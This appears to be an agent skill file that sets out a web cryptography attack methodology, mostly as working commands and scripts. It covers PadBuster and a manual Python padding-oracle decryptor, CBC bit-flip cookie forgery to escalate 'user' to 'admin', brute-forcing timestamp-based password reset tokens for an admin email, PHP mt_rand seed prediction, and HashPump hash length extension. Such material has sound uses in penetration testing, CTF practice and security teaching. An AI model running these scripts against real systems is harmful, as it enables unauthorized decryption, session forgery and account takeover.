---
name: crypto-web-attack
description: "Cryptographic attacks against web applications. Use when you find Padding Oracle error messages, CBC-mode encrypted tokens, predictable randomness/tokens, or opportunities for hash length extension attacks. Covers Padding Oracle (including full PadBuster usage), CBC bit-flip, weak randomness, hash length extension, and ECB block reordering. Note: use jwt-attack-methodology for JWT attacks and cookie-analysis for cookie analysis"
zh-signals: "针对 Web 应用的密码学实现攻击，涵盖 Padding Oracle、CBC 位翻转、弱随机数与哈希长度扩展。信号:Padding Oracle,CBC 位翻转,弱随机数,哈希长度扩展,加密绕过"
when-to-use: "Use when you observe padding oracle errors, CBC-encrypted tokens, predictable randomness, or hash length extension opportunities in a web application."
metadata:
  tags: "crypto,padding oracle,cbc,bit-flip,hash,hmac,random,token,cryptography,encryption,decryption,forgery,crypto-attack,magic hash,type juggling,weak-type,PHP-weak-comparison,0e,ecb,aes,padbuster,hashpump"
  category: "exploit"
---

# Web Cryptography Attack Methodology

Cryptographic attacks against web applications do not need to break the algorithm itself — they exploit **implementation flaws**: leaked error messages, predictable randomness, and improper use of encryption modes.

## ⛔ Further Reading (Must Read)

- Detailed Padding Oracle / CBC bit-flip exploitation, weak randomness scripts, hash length extension → [references/crypto-techniques.md](references/crypto-techniques.md)

## Phase 1: Padding Oracle Attack

**Identification**: decryption failures return different errors (200 vs 500 vs 302). Entry points: encrypted cookies, encrypted URL parameters.

**Key signatures**:
- Modify one ciphertext byte → returns 500 (padding error)
- Modify another ciphertext byte → returns 200 or 302 (padding correct but data wrong)
- Different responses = an oracle exists

### PadBuster Tool Usage (Preferred)

```bash
# Install (Perl script)
apt install padbuster
# or
git clone https://github.com/AonCyberLabs/PadBuster.git

# 1. Decrypt an existing ciphertext
padbuster http://target/api ENCRYPTED_TOKEN 16 -encoding 0
# Parameter notes:
#   ENCRYPTED_TOKEN = the ciphertext to decrypt (hex or base64)
#   16 = block size (AES=16, DES=8)
#   -encoding 0 = hex, 1 = lowercase hex, 2 = base64, 3 = URL-encoded base64, 4 = Web-safe base64

# 2. Padding Oracle in a cookie
padbuster http://target/ COOKIE_VALUE 16 \
    -cookies "session=COOKIE_VALUE" \
    -encoding 2  # base64

# 3. Encrypt custom plaintext (forging a cookie)
padbuster http://target/ COOKIE_VALUE 16 \
    -cookies "session=COOKIE_VALUE" \
    -encoding 2 \
    -plaintext '{"user":"admin","role":"admin"}'

# 4. Padding Oracle in a POST request
padbuster http://target/decrypt ENCRYPTED 16 \
    -post "data=ENCRYPTED" \
    -encoding 0

# 5. Specify the error pattern (non-standard error responses)
padbuster http://target/ TOKEN 16 \
    -error "Invalid padding" \
    -encoding 0
```

### Manual Padding Oracle in Python (When PadBuster Is Unavailable)

```python
#!/usr/bin/env python3
"""Padding Oracle decryption script"""
import requests

URL = "http://target/api"
BLOCK_SIZE = 16  # AES

def oracle(ciphertext_hex):
    """Send the ciphertext and determine whether the padding is valid"""
    r = requests.get(f"{URL}?token={ciphertext_hex}")
    # Adjust the decision condition to match the actual behavior
    return r.status_code != 500  # 500=padding error, 200=padding OK

def decrypt_block(prev_block, curr_block):
    """Decrypt a single block"""
    intermediate = bytearray(BLOCK_SIZE)
    plaintext = bytearray(BLOCK_SIZE)

    for pos in range(BLOCK_SIZE - 1, -1, -1):
        padding_val = BLOCK_SIZE - pos
        # Set the known intermediate values
        test = bytearray(BLOCK_SIZE)
        for k in range(pos + 1, BLOCK_SIZE):
            test[k] = intermediate[k] ^ padding_val

        for guess in range(256):
            test[pos] = guess
            test_hex = (bytes(test) + bytes(curr_block)).hex()
            if oracle(test_hex):
                intermediate[pos] = guess ^ padding_val
                plaintext[pos] = intermediate[pos] ^ prev_block[pos]
                break

    return bytes(plaintext)

# Usage: split the ciphertext into BLOCK_SIZE chunks and decrypt block by block
```

→ Full principles and more scenarios → [references/crypto-techniques.md](references/crypto-techniques.md)

## Phase 2: CBC Bit-Flip Attack

Modify a byte in ciphertext block N → precisely flip the corresponding byte in plaintext block N+1.

**Core formula**: `cipher[offset] ^= ord(original char) ^ ord(target char)`

### Practical Script

```python
import base64

token = "BASE64_ENCRYPTED_COOKIE"
cipher = bytearray(base64.b64decode(token))

# Goal: flip "user" to "admin" (assumed to be in the second block)
# Modify the corresponding bytes of the first block
offset = 0  # calculate based on the actual plaintext position
cipher[offset]     ^= ord('u') ^ ord('a')
cipher[offset + 1] ^= ord('s') ^ ord('d')
cipher[offset + 2] ^= ord('e') ^ ord('m')
cipher[offset + 3] ^= ord('r') ^ ord('i')
# Note: the plaintext of the first block is destroyed (turned into garbage), but the second block is precisely modified

new_token = base64.b64encode(cipher).decode()
print(f"Forged token: {new_token}")
```

**Note**: the plaintext of the modified block becomes garbage. If the application inspects the data in that block, the attack fails.

→ Detailed exploitation → [references/crypto-techniques.md](references/crypto-techniques.md)

## Phase 3: Weak Randomness / Predictable Tokens

**Identification**: is the password reset token based on a timestamp? Does the session ID increment? Is the CSRF token predictable?

### Timestamp Brute-Force

```python
import hashlib, time, requests

target_email = "admin@target.com"
# Get the timestamp around the "reset password" request
reset_time = int(time.time())
for ts in range(reset_time - 60, reset_time + 60):
    token = hashlib.md5(f"{ts}{target_email}".encode()).hexdigest()
    r = requests.get(f"http://target/reset?token={token}")
    if r.status_code == 200 and 'expired' not in r.text:
        print(f"[+] Valid token: {token} (timestamp: {ts})")
        break
```

### Predicting PHP mt_rand()

```bash
# PHP's mt_rand() allows inferring the seed from the output
# Tool: php_mt_seed
php_mt_seed OUTPUT_VALUE
# Once you have the seed, predict the subsequent outputs
```

## Phase 4: Hash Length Extension

**Preconditions**:
- The server signs with `H(secret + message)` (MD5/SHA1/SHA256)
- You know the `message` and `H(secret + message)`
- You do not know the `secret`

### Using HashPump

```bash
# Install
apt install hashpump
# or pip install hashpumpy

# Usage
hashpump -s ORIGINAL_HASH -d 'original_data' -a '&admin=true' -k SECRET_LENGTH
# SECRET_LENGTH needs brute force enumeration (usually 8-32)

# Python version
import hashpumpy
for key_len in range(8, 33):
    new_hash, new_data = hashpumpy.hashpump(
        original_hash, 'original_data', '&admin=true', key_len
    )
    # Send the request with new_hash and new_data to test
```

**Not applicable**: HMAC, SHA-3, BLAKE2.

## Phase 5: CTF Quick Reference

| What You See | Direction | Tool |
|----------|------|------|
| Encrypted cookie + different errors | Padding Oracle | `padbuster` |
| `role=user` encrypted cookie | CBC bit-flip | Python XOR script |
| Password reset + short token | Weak randomness | Timestamp brute-force script |
| `sign=md5hash` | Hash length extension | `hashpump` |
| `eyJ...` Base64 JSON | JWT | JWT brute-force tool |
| PHP `mt_rand()` | Seed prediction | `php_mt_seed` |
| AES-ECB cookie | ECB block reordering | Manual cut-and-paste |
